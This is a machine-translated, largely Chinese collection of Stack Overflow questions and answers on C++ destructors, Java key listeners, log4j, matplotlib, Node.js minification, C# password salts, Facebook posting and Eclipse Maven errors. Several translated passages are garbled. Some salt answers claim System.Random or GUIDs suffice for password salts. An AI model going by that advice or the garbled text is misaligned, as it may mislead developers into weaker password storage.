*   如果它们在自动存储中，是的。您可以拥有`std::string* s = new std::string`，在这种情况下，您必须自己删除它。

*   没什么，您需要手动删除您拥有的内存（用于分配的内存`new`）。

*   如果你分配`b`了`new`，你应该在析构函数中明确地销毁它。

一个好的经验法则是对代码中`delete/delete[]`的每一个`new/new[]`都使用 a。

更好的经验法则是使用 RAII，并使用智能指针而不是原始指针。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-22T08:25:50.857

这取决于。`std::vector`并且它们`std::string`都有`MyClass`一个共同点——如果你将一个变量声明为这些类型中的任何一种，那么它将在堆栈上分配，对于你所在的当前块是本地的，并在该块结束时被破坏。

例如

```
{
    std::vector<std::string> a;
    std::string b;
    MyClass c;
} //at this point, first c will be destroyed, then b, then all strings in a, then a. 
```

如果你得到指针，你猜对了：只有指针本身占用的内存（通常是 4 字节整数）会在离开作用域时自动释放。除非您明确指出指向的内存`delete`（无论它是否在向量中），否则指向的内存不会发生任何事情。如果您有一个包含指向其他对象的指针的类，您*可能*必须在析构函数中删除它们（取决于该类是否*拥有*这些对象）。请注意，在 C++11 中有指针类（称为智能指针），可以让您以与“普通”对象类似的方式处理指针：

前任：

```
{
    std::unique_ptr<std::string> a = make_unique<std::string>("Hello World");
    function_that_wants_string_ptr(a.get());
} //here a will call delete on it's internal string ptr and then be destroyed 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-22T08:20:55.877

> 如果我有类似 std::vector 的东西，当调用向量析构函数时会发生什么？

这取决于。

如果你有一个**values** `std::vector <MyClass>`向量，那么向量的析构函数会为向量中的每个实例调用析构函数`MyClass`。

如果您有一个**指针** `std::vector <MyClass*>`向量，那么您有责任删除`MyClass`.

> 如果我在一个类中有一个指向另一个类的指针会发生什么

`ClassB`实例将保留在内存中。`ClassA`让析构函数为您完成工作的可能方法是创建`B`实例成员或智能指针。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-22T08:34:16.440

`std::vector`，`std::string`据我所知，所有其他 STL 容器都有自动析构函数。这就是为什么最好使用这些容器而不是使用这些容器的原因`new`，`delete`因为这样可以防止内存泄漏。

只有当您的向量是对象向量 ( ) 而不是指向对象的指针向量 () 时，`myClass`才会调用您的析构函数。`myClass``std::vector< myClass >``myClass``std::vector< myClass* >`

在第一种情况下，析构函数也将为其每个元素`std::vector`调用析构函数；`myClass`在第二种情况下， 的析构函数`std::vector`将调用 的析构函数`myClass*`，这意味着它将释放用于存储每个指针的空间，但不会释放用于存储`myClass`对象本身的空间。

您指向的`Class B`对象不会被销毁，但分配用于存储其指针的空间将被释放。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-08-22T08:37:28.797

1.  是的。`std::vector`并且`std::string`在它们超出范围时自动调用，还调用包含的对象的析构函数（for `std::vector`）。

2.  如前所述，`std::vector`当它超出范围时被销毁，调用所包含对象的析构函数。但实际上，在这种情况下，包含的对象是指针，而不是指针所指向的对象。所以你必须`delete`手动给他们。

3.  同（2）。A 将被销毁，因此指针，但不是 B 指向的类。您必须为 A 提供`delete`B的析构函数。

In C++11 there is a very useful solution: use `std::unique_pointer`. Can be use only to point a single object and this will be deleted when the pointer goes out of scope (for example when you destroy your `std::vector`).

[http://en.cppreference.com/w/cpp/memory/unique_ptr](http://en.cppreference.com/w/cpp/memory/unique_ptr)

# java - 枚举单例实现 keyListener

> ID：12068953
> 
> 赞同：0
> 
> 时间：2012-08-22T08:16:12.847
> 
> 标签：java, interface, singleton

我有一个用于键盘轮询的简单单例，它实现 keyListener 只是为了改变布尔值的状态。我通过 getKeyListener() 获取 keyListener 对象。我不确定这是否是要走的路，但代码有效。可能有更好的方法来实现这一点吗？

更新：使用 bitset 轮询键输入的更简单方法

```
package Singleton;

import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.util.BitSet;

public enum bitKeyProcessor implements KeyListener{

INSTANCE;

private final BitSet bitset = new BitSet();

@Override
public void keyPressed(KeyEvent e) {
    bitset.set(e.getKeyCode());
}

@Override
public void keyReleased(KeyEvent e) {
    try{bitset.clear(e.getKeyCode());}
    catch(Exception ex) {ex.printStackTrace();}
}

public void keyTyped(KeyEvent e) {};

public boolean isUp(){
    if(bitset.get(KeyEvent.VK_UP))
        return true;    
    return false;
}

....

public boolean isUpRight(){
    if( isUp() && isRight())
        return true;
    return false;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T10:30:48.990

我认为您的单身人士没有问题，我只是不确定其中的代码。

与其为 Key Up/Down 创建两个单独的布尔数组，不如实现一个`KeyProcessor`.

每当收到关键事件时，发送`keycode`到`Keyporcessor`与它相关联的操作

例如

```
 KeyProcessor.sendKeyEvent(keycode, PRESSED);
  KeyProcessor.sendKeyEvent(keycode, RELEASED);
  KeyProcessor.sendKeyEvent(keycode, TYPED); 
```

现在创建一个命令映射，其中您将拥有使用 keycode & command 构造的键的 Hashmap。

```
Hashmap.put(keycode, PROCCESS_KEY_A)

enum command
{
PROCCESS_KEY_A;
pressed(){};
released(){};
typed(){};
} 
```

`sendKeyEvent``enum`将根据从命令映射中检索到的关键事件调用方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T10:40:21.273

我要问的第一件事是为什么您的枚举不实现`KeyListener`接口本身？这将使您的代码更具可读性，并消除对静态的任何需求（`INSTANCE`当然，除了 之外）。

```
enum eSingleton implements KeyListener {
    INSTANCE;

    private boolean[] keyUp = new boolean[256];
    private boolean[] keyDown = new boolean[256];
    private boolean listen;

    public void update(){
        keyUp = new boolean[256];
    }

    public void listen(final boolean startStop){
        listen = startStop;
    }

    public boolean isKeyUp(int key){
        return keyUp[key];
    }

    public boolean isKeyDown(int key){
        return keyDown[key];
    }

    @Override
    public void keyPressed(KeyEvent e) {
        keyUp[e.getKeyCode()] = false;
        keyDown[e.getKeyCode()] = true;
    }

    @Override
    public void keyReleased(KeyEvent e) {
        keyUp[e.getKeyCode()] = true;
        keyDown[e.getKeyCode()] = false;
    }

    @Override
    public void keyTyped(KeyEvent e) {}
} 
```

# log4j - 每月备份的 Log4j 属性文件

> ID：12068954
> 
> 赞同：1
> 
> 时间：2012-08-22T08:16:15.107
> 
> 标签：log4j

`log4j.properties`为了在每个月底（每月滚动）备份日志文件并继续为活动日志文件使用相同的名称，文件中需要什么配置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-23T13:10:20.443

所以我发现这`DatePattern`可以解决问题：

```
log4j.appender.applog=org.apache.log4j.DailyRollingFileAppender
log4j.appender.applog.encoding=UTF-8
log4j.appender.applog.layout=org.apache.log4j.PatternLayout
log4j.appender.applog.layout.ConversionPattern=%d{yyyyMMdd HH:mm:ss} %m%n
log4j.appender.applog.File=log/process.log
log4j.appender.applog.DatePattern='.'yyyy-MM 
```

此处，活动日志文件的名称始终为“process.log”，并且在每个月初，当该月的第一个日志被推送到 log4j 时，该文件以“process.log.yyyy-MM”的名称保存，并且活动日志文件被重置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:28:43.167

您可以选择 DailyRollingFileAppender 和日期模式配置。参考[http://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/DailyRollingFileAppender.html](http://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/DailyRollingFileAppender.html) 和 [http://www.tutorialspoint.com/log4j/log4j_logging_files.htm](http://www.tutorialspoint.com/log4j/log4j_logging_files.htm)

# installation - 我更改了 gcc 的 libgomp 源代码。如何单独安装 libgomp

> ID：12068957
> 
> 赞同：1
> 
> 时间：2012-08-22T08:16:18.577
> 
> 标签：installation, libgomp

我最近对 ​​gcc-4.7.0 源代码的 libgomp 做了一些改动。如何单独安装 libgomp。我知道我可以安装已更改的总 gcc。但也许我会再次对 libgomp 进行一些更改，并且我不想花太多时间再次安装更改后的 gcc。我想知道如何单独安装 libgomp 源代码。谢谢！

# python - 如何使用 numpy 中的矩阵作为 matplotlib 中某些绘图函数的输入？

> ID：12068962
> 
> 赞同：0
> 
> 时间：2012-08-22T08:16:37.323
> 
> 标签：python, numpy, matplotlib

我想在 3D 坐标中绘制四个点（或相互连接的线）。并且坐标存储在X，Y和Z中。例如，我有以下几行：

```
from mpl_toolkits.mplot3d import Axes3D
import numpy as np
import matplotlib.pyplot as plt

fig = plt.figure()
ax = fig.gca(projection='3d')
X = np.matrix('-1, 1, 1, 2')
Y = np.matrix('1, 2, 4, 6')
Z = np.matrix('3, 4, 2, 1')

ax.plot(X, Y, Z)
plt.show() 
```

但是运行后会出现类型错误。我猜这是由于 numpy 中矩阵类型的输入。有人知道如何轻松解决这个问题吗？

错误信息：

```
Traceback (most recent call last):
  File "C:\Users\I077165\Desktop\tmp.py", line 11, in <module>
    ax.plot(X, Y, Z)
  File "C:\Python27\lib\site-packages\mpl_toolkits\mplot3d\axes3d.py", line 1312, in plot
    lines = Axes.plot(self, xs, ys, *args[argsi:], **kwargs)
  File "C:\Python27\lib\site-packages\matplotlib\axes.py", line 3848, in plot
    for line in self._get_lines(*args, **kwargs):
  File "C:\Python27\lib\site-packages\matplotlib\axes.py", line 323, in _grab_next_args
    for seg in self._plot_args(remaining, kwargs):
  File "C:\Python27\lib\site-packages\matplotlib\axes.py", line 284, in _plot_args
    raise ValueError, 'third arg must be a format string'
ValueError: third arg must be a format string 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T08:51:27.260

对所有三个数据集使用`np.array()`而不是。`np.matrix()`

所以对于X数据，`np.matrix('-1, 1, 1, 2')`应该变成`np.array([-1, 1, 1, 2])`

# java - Flying Saucer 库是否支持 Google App-Engine？

> ID：12068968
> 
> 赞同：4
> 
> 时间：2012-08-22T08:17:06.727
> 
> 标签：java, google-app-engine, flying-saucer

我正在尝试从我的应用程序中的 HTML 文件创建 PDF。我的整个应用程序正在为 Java 开发 Google App-Engine(GAE)。
飞碟库是否支持 GAE？

如果有人知道，请给我解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-11-07T17:29:43.950

**Java7**

[Flying Saucer 使用在AppEngine Java 7 Runtime Environment](https://cloud.google.com/appengine/docs/standard/java/runtime)中受限的 Abstract Window Toolkit (java.awt.*) 。尝试使用 Flying Source 会给出：

```
java.lang.NoClassDefFoundError: Could not initialize class org.xhtmlrenderer.pdf.ITextOutputDevice
    at org.xhtmlrenderer.pdf.ITextRenderer.<init>(ITextRenderer.java:102)
    at org.xhtmlrenderer.pdf.ITextRenderer.<init>(ITextRenderer.java:98) 
```

但是，Flying Sourcer 可以在 AppEngine 柔性环境中使用。

**Java8** 在[AppEngine Java 8 Runtime Evnvironment](https://cloud.google.com/appengine/docs/standard/java/runtime-java8)中，飞碟就像一个魅力。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-09-11T07:22:28.787

Flying Saucer 需要一个格式良好的 XML（在本例中为您的 html）来创建 pdf 导出文件。由于 GAE 支持 servlet

[https://developers.google.com/appengine/docs/java/#Java_Requests_and_servlets](https://developers.google.com/appengine/docs/java/#Java_Requests_and_servlets)

将飞碟引擎包含在 servlet 中可能并不难。像这样的东西

```
import java.io.IOException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class MyFSServlet extends HttpServlet {
    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {
        try {
    StringBuffer buf = new StringBuffer();
    buf.append("<html YOUR HTML CODE HERE>"); //could be retrieve from somewhere else
    DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
    Document doc = builder.parse(new StringBufferInputStream(buf.toString()));
    ITextRenderer renderer = new ITextRenderer();
    renderer.setDocument(doc, null);
    renderer.layout();
    OutputStream os = resp.getOutputStream();
    renderer.createPDF(os);
    os.close();
} catch (Exception ex) {
    ex.printStackTrace();
}
    } 
```

}

# javascript - 缩小 NodeJS 中使用的代码是否有意义？

> ID：12068971
> 
> 赞同：58
> 
> 时间：2012-08-22T08:17:15.490
> 
> 标签：javascript, node.js, minify, google-closure-compiler, uglifyjs

我想知道，由于 Clojure Compiler 和 UglifyJS 不仅优化了代码的大小，而且还优化了性能（尽管我认为大小是主要优先事项），如果我的 node.js 应用程序被缩小，它会运行得更快吗？我知道这可能取决于应用程序，但我一般都在问这个。

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2016-07-01T00:28:19.413

缩小**可以**提高性能。

Node 的 V8 优化编译器根据一些启发式内[联函数。](https://en.wikipedia.org/wiki/Inline_expansion)缩小会影响这些启发式方法。这可能会导致以前未内联的函数内联。由于内联函数通常执行得更快，因此可以提高性能。

###Node 9.0+ / V8 6.2+ (Turbofan) - 小的性能改进

如果函数的未优化字节码大小小于 500，它将被内联。缩小通常会减少 AST（抽象语法树）节点数。由于字节码是直接从 AST 生成的，我们可以预期字节码大小也会有所减少。

来源：[[Turbofan] 使用字节码大小进行内联启发式算法。](https://github.com/v8/v8/commit/3e47cb87d63bb1ca70d547834be3d9f462046a87)

###Node 8.3+ / V8 5.9+ (Turbofan) → 轻微的性能改进

如果函数的 AST 节点数小于 196，它将被内联。缩小通常会减少 AST 节点数。

来源：[[turbofan]不要考虑内联启发式的源大小。](https://github.com/v8/v8/commit/0702ea3000df8235c8bfcf1e99a948ba38964ee3)

###Node 8.2 及之前/V8 5.8（曲轴）及之前 → 主要性能改进

如果函数的字符数（包括空格和注释）[少于 600](https://wingolog.org/archives/2011/08/02/a-closer-look-at-crankshaft-v8s-optimizing-compiler)，它将被内联。

假设我们有一个超过 600 个字符的函数：

```
function f() {
  // A long comment... bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla bla
  return 1;
} 
```

缩小将其减少到`function f(){return 1}`.

如果我们现在调用这两个变量 n 次并比较*原始*函数和*缩小*函数的性能，我们会得到以下结果：

[![原始与缩小性能](../Images/b51c4e4c8dbf9cceccb0da7463bbf491.png)](https://i.stack.imgur.com/tle3U.jpg)

显然，缩小后的函数的执行速度是原来的*两倍多*。

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2012-08-22T08:26:18.403

在 node 中，主要的处理成本是 I/O 操作，而不是实际的 JavaScript 本身。例如：

```
fs.readFile(myFile, function (err, data) {
    processTheFile(data);
}); 
```

在这里，调用`readFile`和被触发的回调之间的间隔将比回调所花费的时间长几倍。（如果反过来，您可能不应该使用节点。）

因此，针对速度优化`processTheFile`函数是没有意义的，因为您节省了非常少数量的一小部分。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-09-11T01:54:37.127

不再真实。

> 是的，Node6 现在基于使用 TurboFan 的 v8 5.1。正如 v8 团队所说（[https://bugs.chromium.org/p/v8/issues/detail?id=3354](https://bugs.chromium.org/p/v8/issues/detail?id=3354)）他们放弃了内联的字符计数触发器。

[https://medium.com/@c2c/yes-node6-is-now-based-on-v8-5-1-7a645eb9992b](https://medium.com/@c2c/yes-node6-is-now-based-on-v8-5-1-7a645eb9992b) [https://bugs.chromium.org/p/v8/issues/detail?id= 3354](https://bugs.chromium.org/p/v8/issues/detail?id=3354)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-06-18T20:39:23.180

我创建了一个 nodejs cli，它生成了一个带有一些预定义类的新应用程序。我认为在这种情况下，缩小基本代码是有意义的。因为您希望允许开发人员使用它，但不修改它（或至少让它很难做到）。这样我会推动开发人员下载新版本，而不是更新应用程序中的类。

# c# - 修剪盐的安全风险

> ID：12068973
> 
> 赞同：4
> 
> 时间：2012-08-22T08:17:20.223
> 
> 标签：c#, hash, cryptography, base64, salt

因此，我最近为密码相关方法创建了一个静态类，并且必须创建一个生成安全盐的方法。

最初，我实现`RNGCryptoServiceProvider`并将 n 个字节归档到一个数组中，然后将其转换为 base64 并返回。

问题在于输出长度在转换后当然比 n 长（[这是有道理的](https://en.wikipedia.org/wiki/Base64#Padding)）。

为了解决这个问题，我将函数更改为下面的方法，我只是想知道通过修剪 base64 字符串是否会引发任何安全风险？

```
/// <summary>
/// Generates a salt for use with the Hash method.
/// </summary>
/// <param name="length">The length of string to generate.</param>
/// <returns>A cryptographically secure random salt.</returns>
public static string GenerateSalt(int length)
{
    // Check the length isn't too short.
    if (length < MIN_LENGTH)
    {
        throw new ArgumentOutOfRangeException("length", "Please increase the salt length to meet the minimum acceptable value of " + MIN_LENGTH + " characters.");
    }

    // Calculate the number of bytes required.
    // https://en.wikipedia.org/wiki/Base64#Padding
    // http://stackoverflow.com/questions/17944/how-to-round-up-the-result-of-integer-division
    int bytelen = ((3 * length) + 4 - 1) / 4;

    // Create our empty salt array.
    byte[] bytes = new byte[bytelen];

    // Where we'll put our generated salt.
    string salt;

    // Generate a random secure salt.
    using (RNGCryptoServiceProvider randcrypto = new RNGCryptoServiceProvider())
    {
        // Fill our array with random bytes.
        randcrypto.GetBytes(bytes);

        // Get a base64 string from the random byte array.
        salt = GetBase64(bytes);
    }

    // Trim the end off only if we need to.
    if (salt.Length > length)
    {
        // Substring is the fastest method to use.
        salt = salt.Substring(0, length);
    }

    // Return the salt.
    return salt;
} 
```

另外作为一个附带问题，我快速浏览了一下，实际上无法找到`C#`实现的哈希函数`RNGCryptoServiceProvider`实际上是什么。有人知道随手吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T08:31:21.450

Why is the length of the salt so important to you? I wouldn't think that there are any real security implication, since the only real requirement of a salt is that it be random and unguessable.

In other words, go for it.

**EDIT: Here is another way of doing it using Linq.**

```
Random random = new Random();
int length = 25; // Whatever length you want
char[] keys = "ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!£$%^&*()".ToCharArray(); // whatever chars you want
var salt = Enumerable
    .Range(1, length) // equivalent to the loop bit, for(i.. ) 
    .Select(k => keys[random.Next(0, keys.Length - 1)])  // generate a new random char 
    .Aggregate("", (e, c) => e + c); // join them together into a string 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T08:31:26.533

There is no security risk with that way of generating the salt.

The salt doesn't need that level of security at all, it's just there so that rainbow tables can't be used to crack the hash/encryption. The regular `Random` class would be enough to create a salt.

Example:

```
/// <summary>
/// Generates a salt for use with the Hash method.
/// </summary>
/// <param name="length">The length of string to generate.</param>
/// <returns>A random salt.</returns>
public static string GenerateSalt(int length) {
    // Check the length isn't too short.
    if (length < MIN_LENGTH) {
        throw new ArgumentOutOfRangeException("length", "Please increase the salt length to meet the minimum acceptable value of " + MIN_LENGTH + " characters.");
    }

    // Where we'll put our generated salt.
    StringBuilder salt = new StringBuilder(length);

    // Fill our string with random characters.
    Random rnd = new Random();
    string chars = "0123456798ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (int i = 0; i < length; i++) {
      salt.Append(chars[rnd.Next(chars.Length)]);
    }

    // Return the salt.
    return salt.ToString();
} 
```

Note: If the function would be used more than once close in time, you would use a single `Random` object and pass into the function, as `Random` instances created too close in time will give the same random sequence.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T09:20:11.740

只是为了好玩，这是一种更快的方法（即使代码看起来不太好）。尝试剪切并粘贴它以查看。在我的机器上，它的执行时间约为 1.6 秒，而 7.1 秒。由于我在每种情况下都进行了一百万次迭代，所以我认为执行时间并不那么重要！

```
string msg = "";
int desiredLength = 93; // Length of salt required
Stopwatch watch = new Stopwatch();
watch.Start();
for (int k=0; k<1000000; k++)
{
    double guidsNeeded = Math.Ceiling(desiredLength / 36.0);
    string salt = "";
    for (int i=0; i<guidsNeeded; i++)
    {
       salt += Guid.NewGuid().ToString();
    }
    salt = salt.Substring(0,desiredLength);
}
msg += watch.ElapsedMilliseconds.ToString(); // 1654 ms

watch.Start();
for (int j=0; j<1000000; j++)
{
    GenerateSalt(93);
}
msg += "\r\n" + watch.ElapsedMilliseconds.ToString(); // 7096 ms 
```

这是使用 Guffa 的代码`GenerateSalt`。

# c# - 如何获取分页数据源中所有项目的 ID？

> ID：12068991
> 
> 赞同：0
> 
> 时间：2012-08-22T08:19:00.127
> 
> 标签：c#, silverlight, wcf-ria-services

在 Silverlight 应用程序中，我有一个数据源，它显示在带有寻呼机的网格中。有几个控件可以更改查询和/或过滤的参数。使用寻呼机（显然）是因为返回的项目数量可能非常大。

对于某个操作，我只需要数据源中*所有项目的 ID（Guid）。*我怎样才能做到这一点？我想这样做而不必传输所有数据对象。

所以基本上像

```
dds.Select(o => o.Id).ToList() 
```

# php - 在页面墙上发布 PHP

> ID：12068992
> 
> 赞同：0
> 
> 时间：2012-08-22T08:19:03.407
> 
> 标签：php, facebook

我有一个网站，用户可以免费发布工作。如何将这些帖子链接到有关该网站的 Facebook 页面？我不希望用户登录到 fb。此时我将它们发布到 Twitter，然后使用选择性推文将它们发布到我的页面上。但是选择性推文无法发布特定于该工作的徽标。

我创建了一个 fb 应用程序。没有选择任何东西，只是给了它一个名字并得到了一个 appID 和 appSecret。我现在没有在“选择您的应用程序如何与 Facebook 集成”中选择什么。因为它不是移动应用程序，也不是使用 fb 登录的网站。

亲切的问候。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T20:03:22.200

您可以通过 MYSQL 和 PHP 轻松完成此操作，具体取决于您当前站点的设置方式。我要做的是在保存时将作业存储到单独的表中，就像这样

（表）Facebook
pageid //数值
标题//职位标题
消息//职位描述

以便您可以将其用于下一部分。

通过 Facebook 创建一个应用程序并向用户和您的 Facebook 页面提供身份验证。通过将此应用程序添加到您的页面，您可以调用以下内容：

$facebook->set_user($user, $session_key);

$facebook->api_client->stream_publish($item['header'], $item['message'], $item['pageid']);

使用您从 facebook 获取的密钥。

然后，您可以运行一个每 x 分钟更新一次的 Cron，在它发布后，在一个数组中，您可以清除表中的下一行作业。

让我知道你在这方面的位置，我会尽力提供帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:22:37.927

您可以在 facebook 的 facebook 设施上使用分享，来自[http://developer.facebook.com](http://developer.facebook.com)。您可以轻松地将其添加到您的网站。玩得开心！

# eclipse - Eclipse：在“更新 Maven 项目”期间发生内部错误。org/apache/maven/plugin/war/util/MappingUtils

> ID：12068998
> 
> 赞同：1
> 
> 时间：2012-08-22T08:19:50.613
> 
> 标签：eclipse, maven, eclipse-wtp

添加对 pom.xml 的依赖项并通过 `Maven -> Update Project` 我收到此错误进行更新（请参阅下面的 .log）

> !ENTRY org.eclipse.core.jobs 4 2 2012-08-22 10:04:31.078 !MESSAGE 在“更新 Maven 项目”期间发生内部错误。!STACK 0 java.lang.NoClassDefFoundError: org.maven.ide.eclipse.wtp.namemapping.PatternBasedFileNameMapping.mapFileName(PatternBasedFileNameMapping.java:36) 在 org.maven 的 org/apache/maven/plugin/war/util/MappingUtils。 ide.eclipse.wtp.WebProjectConfiguratorDelegate.configureClasspath(WebProjectConfiguratorDelegate.java:367) 在 org.maven.ide.eclipse.wtp.WTPProjectConfigurator.configureClasspath(WTPProjectConfigurator.java:95) 在 org.eclipse.m2e.jdt.internal.DefaultClasspathManagerDelegate。 populateClasspath(DefaultClasspathManagerDelegate.java:61) 在 org.eclipse.m2e.jdt.internal.BuildPathManager.getClasspath(BuildPathManager.java:303) 在 org.eclipse.m2e.jdt.internal。

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-10T10:42:33.520

好的，一个迟到的答案，但我遇到了同样的问题，我通过删除我的 Maven 存储库来修复它。/.m2/存储库

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T13:07:31.207

检查`maven-war-plugin`POM 中的版本并确保它是`2.2`